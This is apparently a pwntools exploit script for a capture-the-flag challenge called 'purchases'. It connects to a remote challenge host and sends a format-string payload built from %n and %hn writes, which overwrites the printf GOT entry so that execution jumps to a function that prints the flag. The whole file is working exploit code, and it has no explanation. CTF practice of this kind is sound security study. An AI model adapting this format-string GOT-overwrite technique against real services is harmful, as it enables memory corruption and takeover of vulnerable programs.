#!/usr/bin/env python

from pwn import *

local = 0

if local:
	r = process("./purchases")
	gdb.attach(r, '''
		set disable-randomization off
		break *0x4012c5
		c
		''')
else:
	r = remote("shell.actf.co", 19011)


r.recvuntil("purchase?")

PRINTF_GOT		= 0x404040
PUTS_GOT		= 0x404018
FLAG 			= 0x4011b6

# input in 8th pos

payload = ''
payload += "%57x%12$n".rjust(16)
payload += "%4466x%13$hn".rjust(16)
payload += "\x42\x40\x40\x10\x00\x00\x00\x00" # the last byte gets nulled
payload += "\x40\x40\x40\x00\x00\x00\x00\x00"

r.sendline(payload)

r.interactive()
